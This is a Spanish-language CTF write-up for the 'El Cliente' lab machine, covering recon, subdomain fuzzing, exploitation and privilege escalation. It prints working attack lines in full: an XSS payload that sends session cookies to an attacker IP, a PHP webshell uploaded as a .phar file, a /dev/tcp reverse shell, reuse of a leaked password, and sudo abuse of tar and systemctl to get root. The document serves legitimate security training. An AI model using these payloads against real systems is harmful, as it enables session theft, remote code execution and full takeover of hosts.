---
title: El Cliente
description: La seguridad ofensiva es la adrenalina pura del mundo cibernético. Enfréntate a sistemas desafiantes, explora vulnerabilidades y despliega tácticas de hacking para descubrir brechas antes que los malos. ¡Cada reto en una plataforma de CTF es una oportunidad para afilar tus habilidades y dominar el arte del ataque!
date: 2025-03-05
toc: true
pin: false
image:
 path: /assets/img/thl-writeup-elcliente/elcliente_logo.png
categories:
  - The_Hackers_Labs
tags:
  - linux
  - the_hackers_labs
  - ssh
  - http
  - tcp
  - fuzzing_web
  - xss
  - cookie_hijacking
  - rce
  - data_leaks
  - sudo_abuse
  - suid
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - foothold
  - lateral_movement
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/thl/elcliente:-$ sudo arp-scan -l | grep 08:00
192.168.0.100    08:00:27:12:86:d5       PCS Systemtechnik GmbH
```

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/thl/elcliente:-$ ping -c 1 192.168.0.100
PING 192.168.0.100 (192.168.0.100) 56(84) bytes of data.
64 bytes from 192.168.0.100: icmp_seq=1 ttl=64 time=0.187 ms

--- 192.168.0.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.187/0.187/0.187/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/thl/elcliente:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 192.168.0.58 -oG nmap1
Host: 192.168.0.58 ()	Status: Up
Host: 192.168.0.58 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/thl/elcliente:-$ sudo nmap -sCV -p22,80 -vvv 192.168.0.58 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1691396659eb2fc5653c9a41311af337 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBm45ij8KDUi+j313OzxXg3tdsWAlRfPktQEBIU5b+GML05aHz6y4D0vWyhpHWe4q94oApepJc78urT940zIy3g=
|   256 a7877781bdceb27b78a639008b039116 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH17hNhZeTYGdOv0xNgLdZsdjn56wounp77DFfhQTM4Q
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Arka Construcciones
MAC Address: 08:00:27:12:86:D5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/thl/elcliente:-$ whatweb 192.168.0.58
http://192.168.0.58 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.0.58], JQuery, Script, Title[Arka Construcciones]
```

---
## Web Analysis

Al acceder al servicio web mediante la dirección IP, encuentro un botón de contacto que me dirige a `arka.thl/contact.php`.

![](assets/img/thl-writeup-elcliente/elcliente1_1.png)

 Para facilitar el acceso, agrego el dominio en mi archivo `/etc/hosts`.

```terminal
/home/kali/Documents/thl/elcliente:-$ echo '192.168.0.58\tarka.thl' | tee -a /etc/hosts
```

La dirección `arka.thl/contact.php` contiene un formulario de contacto que podría ser vulnerable.

![](assets/img/thl-writeup-elcliente/elcliente1_2.png)

Para identificar posibles subdominios, utilizo ffuf con un diccionario de subdominios comunes.

```terminal
/home/kali/Documents/thl/elcliente:-$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://arka.thl/ -H "Host: FUZZ.arka.thl" -fs=9407
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1504ms]
```

Tras encontrar el subdominio `admin.arka.thl`, actualizo nuevamente el archivo `/etc/hosts`.

```terminal
/home/kali/Documents/thl/elcliente:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/thl/elcliente:-$ echo '192.168.0.100\tarka.thl\tadmin.arka.thl' | sudo tee -a /etc/hosts
```

El subdominio encontrado redirige a un archivo `login.php`, lo que indica que el siguiente objetivo será bypassear el formulario de inicio de sesión.

![](assets/img/thl-writeup-elcliente/elcliente1_3.png)

---
## Vulnerability Exploitation

Al realizar pruebas en el formulario de contacto, detecto una vulnerabilidad XSS, lo que me permite ejecutar un ataque de cookie hijacking.

* Para capturar las cookies de sesión, inicio un servidor HTTP en mi máquina atacante.

```terminal
/home/kali/Documents/thl/elcliente:-$ python -m http.server 8080
	Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

* Luego, inyecto el siguiente payload XSS en el formulario.

```js
<img src="" onerror="fetch(`http://192.168.0.99/?cookie=${document.cookie}`);"/>
```

![](assets/img/thl-writeup-elcliente/elcliente2_1.png)

* En mi servidor, recibo la cookie de sesión PHPSESSID de un usuario autenticado.

```terminal
	192.168.0.58 - - [05/Mar/2025 19:31:08] "GET /?cookie=PHPSESSID=07tvvif2b0b013popcsk4itlpv HTTP/1.1" 200 -
```

* Finalmente, utilizo la extensión Edit This Cookie para modificar la cookie en `admin.arka.thl/login`, lo que me permite acceder como un usuario válido.

![](assets/img/thl-writeup-elcliente/elcliente2_2.png)
![](assets/img/thl-writeup-elcliente/elcliente2_3.png)
![](assets/img/thl-writeup-elcliente/elcliente2_4.png)

---
## Foothold

Dentro del panel de administración, encuentro una opción para crear nuevos proyectos. Entre las configuraciones disponibles, se permite subir archivos con extensiones específicas: `.pdf, .docx, .png, .jpeg, .jpg`. Sin embargo, al inspeccionar un proyecto ya creado, noto que contiene un archivo con extensión `.phar`. Tras realizar pruebas, confirmo que también puedo subir este tipo de archivos.

![](assets/img/thl-writeup-elcliente/elcliente3_1.png)

* Aprovechando esto, creo un archivo .phar con código PHP para ejecutar comandos en el sistema.

```terminal
/home/kali/Documents/thl/elcliente:-$ echo "<?php system($_GET['cmd']); ?>" > shell.phar
```

* Subo este archivo malicioso en un nuevo proyecto.

![](assets/img/thl-writeup-elcliente/elcliente3_2.png)

* Una vez guardado, verifico su ubicación en el servidor.

![](assets/img/thl-writeup-elcliente/elcliente3_3.png)

* Para ejecutar comandos, accedo al archivo y utilizo el parámetro cmd con el comando deseado.

![](assets/img/thl-writeup-elcliente/elcliente3_4.png)

* Confirmada la ejecución remota de código, me pongo a la escucha con Netcat y la ejecuto desde la webshell.

```terminal
/home/kali/Documents/thl/elcliente:-$ nc -lnvp 4321
	listening on [any] 4321 ...

http://admin.arka.thl/uploads/67c8d5012e7c5_shell.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.99%2F4321%200%3E%261%22

	... connect to [192.168.0.99] from (UNKNOWN) [192.168.0.58] 39150
bash-5.2$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
bash-5.2$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
kobe:x:1000:1000:kobe:/home/kobe:/bin/bash
scott:x:1001:1001:Scott,,,:/home/scott:/bin/bash
```

Dentro del archivo `db.php`, descubro credenciales en texto plano para el usuario `scott`, `scott`:`gp34cb$ka64tfp10!`.

```terminal
bash-5.2$ cat db.php
```

![](assets/img/thl-writeup-elcliente/elcliente4_1.png)

```terminal
/home/kali/Documents/thl/elcliente:-$ ssh scott@arka.thl
scott@arka.thl's password: gp34cb$ka64tfp10!

bash-5.2$ id
uid=1001(scott) gid=1001(scott) groups=1001(scott),100(users)
```

---


El usuario `scott` puede ejecutar `tar` como `kobe` sin necesidad de contraseña.

```terminal
bash-5.2$ sudo -l
Matching Defaults entries for scott on TheHackersLabs-ElCliente:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on TheHackersLabs-ElCliente:
    (kobe) PASSWD: /usr/bin/tar
```

Según [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), si `tar` se ejecuta con privilegios elevados mediante `sudo`, mantiene estos privilegios y puede ser explotado para escalar privilegios.

Ejecuto el siguiente comando para obtener una shell como `kobe`.

```terminal
bash-5.2$ sudo -u kobe tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

$ id
uid=1000(kobe) gid=1000(kobe) groups=1000(kobe)

$ cat user.txt
```

---
## Privilege Escalation

Verifico nuevamente los comandos que el usuario actual puede ejecutar con `sudo`.

```terminal
$ script /dev/null -c bash

bash-5.2$ sudo -l
Matching Defaults entries for kobe on TheHackersLabs-ElCliente:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User kobe may run the following commands on TheHackersLabs-ElCliente:
    (ALL) NOPASSWD: /bin/systemctl
```

En este caso, `kobe` puede ejecutar systemctl con privilegios de `root` sin necesidad de contraseña.

Según [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo), es posible crear un servicio que modifique los permisos de `/bin/bash` para que tenga el bit SUID activado.

* Creo el archivo de servicio.

```terminal
bash-5.2$ cat x.service/
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target
```

* Enlazo y habilito el servicio.

```terminal
bash-5.2$ sudo systemctl link /home/kobe/x.service
Created symlink /etc/systemd/system/x.service → /home/kobe/x.service.

bash-5.2$ sudo systemctl enable --now /home/kobe/x.service
Created symlink /etc/systemd/system/multi-user.target.wants/x.service → /home/kobe/x.service.
```

Verifico que `/bin/bash` ahora tiene el bit SUID activado.

```terminal
bash-5.2$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Finalmente, ejecuto una shell con privilegios de `root`.

```terminal
bash-5.2$ bash -p
bash-5.2# id
uid=1000(kobe) gid=1000(kobe) euid=0(root) groups=1000(kobe)

bash-5.2# cat /root/root.txt
```